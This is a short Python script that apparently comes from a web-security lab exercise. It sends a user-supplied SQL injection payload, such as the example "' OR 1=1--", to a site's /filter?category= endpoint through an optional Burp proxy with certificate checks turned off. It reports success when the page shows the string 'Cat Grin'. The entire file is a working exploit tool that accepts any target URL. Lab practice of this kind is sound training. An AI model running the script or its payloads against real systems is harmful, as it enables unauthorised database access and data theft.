import requests
import sys
import urllib3

# Disable SSL warnings (useful for labs with self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings for tools like Burp Suite (optional)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def exploit_sqli(url, payload):
    """
    Sends a basic SQL injection payload to the /filter endpoint.
    If the response contains a known string, we assume the injection worked.
    """
    endpoint = "/filter?category="

    try:
        response = requests.get(url + endpoint + payload, verify=False, proxies=proxies)
    except requests.exceptions.RequestException as e:
        print(f"[!] Error occurred: {e}")
        return False

    # Just a sample string to check in the response
    return "Cat Grin" in response.text


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: python3 {sys.argv[0]} <url> <payload>")
        print(f"[-] Example: python3 {sys.argv[0]} https://example.com \"' OR 1=1--\"")
        sys.exit(1)

    print(f"[i] Testing URL: {url} with payload: {payload}")

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful! 🎉")
    else:
        print("[-] SQL injection failed. 😕")
